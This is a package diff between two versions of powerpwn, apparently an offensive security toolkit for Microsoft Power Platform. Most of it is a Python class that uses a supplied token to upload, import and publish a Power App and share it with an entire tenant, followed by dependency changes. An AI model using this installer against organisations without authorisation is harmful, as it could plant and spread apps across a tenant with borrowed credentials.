-        compose_block_id_url = zip_files_shared_access + "&comp=block&blockid=YmxvY2stMDAwMDAwMDA="
-
-        with open(path_to_zip_file, "rb") as fileobj:
-            res = self.__session.put(compose_block_id_url, data=fileobj)
-        if res.status_code != 201:
-            self.__log_error("Could not upload zip file", res)
-            return None
-
-        logger.info("Application zip file uploaded successfully")
-
-        self.__session.headers.pop("X-Ms-Blob-Type")
-        self.__session.headers.update({"X-Ms-Blob-Content-Type": "application/octet-stream"})
-        block_list_url = zip_files_shared_access + "&comp=blocklist"
-        payload = '<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>YmxvY2stMDAwMDAwMDA=</Latest></BlockList>'
-        res = self.__session.put(block_list_url, data=payload)
-
-        if res.status_code != 201:
-            self.__log_error("Could not put block list", res)
-            return None
-
-        self.__session.headers.pop("X-Ms-Blob-Content-Type")
-
-        logger.info("Getting import parameters...")
-        self.__session.headers.update({"Authorization": auth})
-        # Get import parameters to update
-        res = self.__session.post(
-            f"https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/{env_id}/listImportParameters?api-version=2016-11-01",
-            json={"packageLink": {"value": zip_files_shared_access}},
-        )
-
-        if res.status_code != 202:
-            self.__log_error("Failed to get import parameters", res)
-            return None
-
-        list_import_operations_url = res.headers["Location"]
-
-        wait = int(res.headers["Retry-After"])
-        sleep(wait)
-
-        logger.info("Listing import parameters operations...")
-        res = self.__session.get(list_import_operations_url)
-
-        if res.status_code != 200:
-            self.__log_error("Failed to get import operations", res)
-            return None
-
-        res_json = json.loads(res.text)
-        if "resources" not in res_json["properties"]:
-            logger.error("No resources in import package")
-            return None
-
-        logger.info("Setting import parameters...")
-        props = self.__set_import_params(res_json["properties"], app_display_name)
-
-        # TODO: here to update connections etc
-        # Validate import package
-        logger.info("Validating import package...")
-        res = self.__session.post(
-            f"https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/{env_id}/validateImportPackage?api-version=2016-11-01",
-            json=props,
-        )
-
-        if res.status_code != 200:
-            self.__log_error("Failed to validate import package", res)
-            return None
-
-        # import package
-        logger.info("Importing package...")
-        validation_response = json.loads(res.text)
-        res = self.__session.post(
-            f"https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/{env_id}/importPackage?api-version=2016-11-01",
-            json=validation_response,
-        )
-
-        if res.status_code != 202:
-            self.__log_error("Failed to import package", res)
-            return None
-
-        redirect = res.headers["Location"]
-
-        sleep(10)
-
-        # verify import is complete
-        logger.info("Verifying import status...")
-        res = self.__session.get(redirect)
-        if res.status_code not in (200, 202):
-            self.__log_error("Failed to get import status", res)
-            return None
-
-        res_json = json.loads(res.text)
-        import_status = res_json["properties"]["status"]
-        if import_status == "Succeeded":
-            app_id = self.__set_get_app_id(res_json["properties"]["resources"])
-            self.__log_app_details(app_id, env_id)
-            self.__publish_app(app_id)
-        else:
-            message = res_json["properties"]["errors"][0]["message"]
-            logger.error(f"Import failed. Reason: {message}")
-
-    def share_app_with_org(self, app_id: str, environment_id: str, tenant_id: str) -> None:
-        url = f"https://api.powerapps.com/providers/Microsoft.PowerApps/apps/{app_id}/modifyPermissions"
-        params = {"api-version": "2020-06-01", "$filter": f"environment eq '{environment_id}'"}
-        body = {"put": [{"properties": {"principal": {"email": "", "tenantId": tenant_id, "id": None, "type": "Tenant"}, "roleName": "CanView"}}]}
-
-        res = self.__session.post(url, params=params, json=body)
-
-        if res.status_code != 200:
-            self.__log_error("Failed to share app with organization", res)
-            return None
-        logger.info("App shared with organization")
-
-    def __publish_app(self, app_id: str) -> None:
-        logger.info("Publishing app...")
-        url = f"https://api.powerapps.com/providers/Microsoft.PowerApps/apps/{app_id}/publish"
-        params = {"api-version": "2020-06-01"}
-        res = self.__session.post(url, params=params)
-        if res.status_code != 200:
-            self.__log_error("Failed to publish app", res)
-        else:
-            logger.info("App published")
-
-    def __log_error(self, message: str, res: Response) -> None:
-        logger.error(f"{message}. Status code: {res.status_code}, response: {res.text}")
-
-    def __set_import_params(self, input: Dict[str, Any], app_display_name: str) -> Dict[str, Any]:
-        resources = input["resources"]
-        for _, resource in resources.items():
-            if resource["type"] == "Microsoft.PowerApps/apps":
-                resource["selectedCreationType"] = "New"
-                resource["details"]["displayName"] = app_display_name
-
-        return input
-
-    def __log_app_details(self, app_id: str, env_id: str) -> None:
-        app_web_url = f"https://make.powerapps.com/environments/{env_id}/apps/{app_id}/details"
-
-        logger.info(f"Application installed with id {app_id}.")
-        logger.info(f"Application web url: {app_web_url}")
-        logger.info("Getting app run url...")
-        if app := self.__get_canvasapp(app_id, env_id):
-            logger.info(f"Application run url : {app['properties']['appPlayUri']}")
-        else:
-            logger.error("Failed to get app run url")
-
-    def __set_get_app_id(self, resources: Dict[str, Any]) -> str:
-        for _, resource in resources.items():
-            if resource["type"] == "Microsoft.PowerApps/apps":
-                return resource["name"]
-        return ""
-
-    def __get_canvasapp(self, app_id: str, env_id: str) -> Union[Dict[str, Any], None]:
-        url = f"https://api.powerapps.com/providers/Microsoft.PowerApps/apps/{app_id}"
-        params = {"api-version": "2016-11-01", "$filter": f"environment eq '{env_id}'"}
-        self.__session.headers.pop("Accept-Encoding")
-        res = self.__session.get(url=url, params=params)
-        if res.status_code == 200:
-            return json.loads(res.text)
-        return None
+import json
+import logging
+import os
+from time import sleep
+from typing import Any, Dict, Union
+
+from requests import Response
+
+from powerpwn.cli.const import LOGGER_NAME
+from powerpwn.powerdump.utils.requests_wrapper import init_session
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+class AppInstaller:
+    def __init__(self, token: str) -> None:
+        self.__session = init_session(token)
+
+    def install_app(self, path_to_zip_file: str, app_display_name: str, env_id: str) -> None:
+        if not os.path.exists(path_to_zip_file):
+            logger.error(f"Could not find file: {path_to_zip_file}")
+            return None
+
+        _, file_name = os.path.split(path_to_zip_file)
+
+        self.__session.headers.update({"Accept-Encoding": "gzip, deflate, br", "accept": "application/json, text/plain, */*"})
+        # prepare storage
+        logger.info("Preparing app storage")
+        res = self.__session.post(
+            f"https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/{env_id}/generateResourceStorage?api-version=2016-11-01"
+        )
+        if res.status_code != 200:
+            self.__log_error("Could not generate app storage", res)
+            return None
+
+        # upload zip file
+        logger.info("Uploading zip file")
+        shared_access_sig = json.loads(res.text)["sharedAccessSignature"]
+        self.__session.headers.update({"X-Ms-Blob-Type": "BlockBlob"})
+        auth = self.__session.headers.pop("Authorization")
+
+        shared_access_splitted = shared_access_sig.split("?")
+        zip_files_shared_access = shared_access_splitted[0] + f"/{file_name}?" + shared_access_splitted[1]
+        compose_block_id_url = zip_files_shared_access + "&comp=block&blockid=YmxvY2stMDAwMDAwMDA="
+
+        with open(path_to_zip_file, "rb") as fileobj:
+            res = self.__session.put(compose_block_id_url, data=fileobj)
+        if res.status_code != 201:
+            self.__log_error("Could not upload zip file", res)
+            return None
+
+        logger.info("Application zip file uploaded successfully")
+
+        self.__session.headers.pop("X-Ms-Blob-Type")
+        self.__session.headers.update({"X-Ms-Blob-Content-Type": "application/octet-stream"})
+        block_list_url = zip_files_shared_access + "&comp=blocklist"
+        payload = '<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>YmxvY2stMDAwMDAwMDA=</Latest></BlockList>'
+        res = self.__session.put(block_list_url, data=payload)
+
+        if res.status_code != 201:
+            self.__log_error("Could not put block list", res)
+            return None
+
+        self.__session.headers.pop("X-Ms-Blob-Content-Type")
+
+        logger.info("Getting import parameters...")
+        self.__session.headers.update({"Authorization": auth})
+        # Get import parameters to update
+        res = self.__session.post(
+            f"https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/{env_id}/listImportParameters?api-version=2016-11-01",
+            json={"packageLink": {"value": zip_files_shared_access}},
+        )
+
+        if res.status_code != 202:
+            self.__log_error("Failed to get import parameters", res)
+            return None
+
+        list_import_operations_url = res.headers["Location"]
+
+        wait = int(res.headers["Retry-After"])
+        sleep(wait)
+
+        logger.info("Listing import parameters operations...")
+        res = self.__session.get(list_import_operations_url)
+
+        if res.status_code != 200:
+            self.__log_error("Failed to get import operations", res)
+            return None
+
+        res_json = json.loads(res.text)
+        if "resources" not in res_json["properties"]:
+            logger.error("No resources in import package")
+            return None
+
+        logger.info("Setting import parameters...")
+        props = self.__set_import_params(res_json["properties"], app_display_name)
+
+        # TODO: here to update connections etc
+        # Validate import package
+        logger.info("Validating import package...")
+        res = self.__session.post(
+            f"https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/{env_id}/validateImportPackage?api-version=2016-11-01",
+            json=props,
+        )
+
+        if res.status_code != 200:
+            self.__log_error("Failed to validate import package", res)
+            return None
+
+        # import package
+        logger.info("Importing package...")
+        validation_response = json.loads(res.text)
+        res = self.__session.post(
+            f"https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/{env_id}/importPackage?api-version=2016-11-01",
+            json=validation_response,
+        )
+
+        if res.status_code != 202:
+            self.__log_error("Failed to import package", res)
+            return None
+
+        redirect = res.headers["Location"]
+
+        sleep(10)
+
+        # verify import is complete
+        logger.info("Verifying import status...")
+        res = self.__session.get(redirect)
+        if res.status_code not in (200, 202):
+            self.__log_error("Failed to get import status", res)
+            return None
+
+        res_json = json.loads(res.text)
+        import_status = res_json["properties"]["status"]
+        if import_status == "Succeeded":
+            app_id = self.__set_get_app_id(res_json["properties"]["resources"])
+            self.__log_app_details(app_id, env_id)
+            self.__publish_app(app_id)
+        else:
+            message = res_json["properties"]["errors"][0]["message"]
+            logger.error(f"Import failed. Reason: {message}")
+
+    def share_app_with_org(self, app_id: str, environment_id: str, tenant_id: str) -> None:
+        url = f"https://api.powerapps.com/providers/Microsoft.PowerApps/apps/{app_id}/modifyPermissions"
+        params = {"api-version": "2020-06-01", "$filter": f"environment eq '{environment_id}'"}
+        body = {"put": [{"properties": {"principal": {"email": "", "tenantId": tenant_id, "id": None, "type": "Tenant"}, "roleName": "CanView"}}]}
+
+        res = self.__session.post(url, params=params, json=body)
+
+        if res.status_code != 200:
+            self.__log_error("Failed to share app with organization", res)
+            return None
+        logger.info("App shared with organization")
+
+    def __publish_app(self, app_id: str) -> None:
+        logger.info("Publishing app...")
+        url = f"https://api.powerapps.com/providers/Microsoft.PowerApps/apps/{app_id}/publish"
+        params = {"api-version": "2020-06-01"}
+        res = self.__session.post(url, params=params)
+        if res.status_code != 200:
+            self.__log_error("Failed to publish app", res)
+        else:
+            logger.info("App published")
+
+    def __log_error(self, message: str, res: Response) -> None:
+        logger.error(f"{message}. Status code: {res.status_code}, response: {res.text}")
+
+    def __set_import_params(self, input: Dict[str, Any], app_display_name: str) -> Dict[str, Any]:
+        resources = input["resources"]
+        for _, resource in resources.items():
+            if resource["type"] == "Microsoft.PowerApps/apps":
+                resource["selectedCreationType"] = "New"
+                resource["details"]["displayName"] = app_display_name
+
+        return input
+
+    def __log_app_details(self, app_id: str, env_id: str) -> None:
+        app_web_url = f"https://make.powerapps.com/environments/{env_id}/apps/{app_id}/details"
+
+        logger.info(f"Application installed with id {app_id}.")
+        logger.info(f"Application web url: {app_web_url}")
+        logger.info("Getting app run url...")
+        if app := self.__get_canvasapp(app_id, env_id):
+            logger.info(f"Application run url : {app['properties']['appPlayUri']}")
+        else:
+            logger.error("Failed to get app run url")
+
+    def __set_get_app_id(self, resources: Dict[str, Any]) -> str:
+        for _, resource in resources.items():
+            if resource["type"] == "Microsoft.PowerApps/apps":
+                return resource["name"]
+        return ""
+
+    def __get_canvasapp(self, app_id: str, env_id: str) -> Union[Dict[str, Any], None]:
+        url = f"https://api.powerapps.com/providers/Microsoft.PowerApps/apps/{app_id}"
+        params = {"api-version": "2016-11-01", "$filter": f"environment eq '{env_id}'"}
+        self.__session.headers.pop("Accept-Encoding")
+        res = self.__session.get(url=url, params=params)
+        if res.status_code == 200:
+            return json.loads(res.text)
+        return None
```

### Comparing `powerpwn-2.1.4/src/powerpwn.egg-info/PKG-INFO` & `powerpwn-2.1.5/src/powerpwn.egg-info/PKG-INFO`

 * *Files 19% similar despite different names*

```diff
@@ -1,22 +1,23 @@
 Metadata-Version: 2.1
 Name: powerpwn
-Version: 2.1.4
-Author: Michael Bargury
+Version: 2.1.5
+Author: Michael Bargury, Lana Salameh and Avishai Efrat
 Requires-Dist: pydantic[email]==1.10.7
 Requires-Dist: pydantic==1.10.7
 Requires-Dist: swagger-ui-py==22.7.13
 Requires-Dist: Flask==2.2.5
 Requires-Dist: requests>=2.31.0
 Requires-Dist: msal>=1.20.0
 Requires-Dist: responses>=0.23.1
-Requires-Dist: pytest>=7.2.2
-Requires-Dist: prance>=0.22.11.4.0
+Requires-Dist: pytest>=8.1.1
+Requires-Dist: prance>=23.6.21.0
 Requires-Dist: openapi>=1.1.0
 Requires-Dist: openapi-spec-validator>=0.5.6
 Requires-Dist: jsf>=0.7.1
-Requires-Dist: pillow>=10.0.0
+Requires-Dist: pillow>=10.3.0
 Requires-Dist: scandir>=1.10.0
 Requires-Dist: backports.shutil-get-terminal-size>=1.0.0
 Requires-Dist: browsepy>=0.5.6
-Requires-Dist: art
+Requires-Dist: art>=6.1
 Requires-Dist: typing_extensions<4.6.0
+Requires-Dist: pyjwt>=2.6.0
```

### Comparing `powerpwn-2.1.4/src/powerpwn.egg-info/SOURCES.txt` & `powerpwn-2.1.5/src/powerpwn.egg-info/SOURCES.txt`

 * *Files identical despite different names*

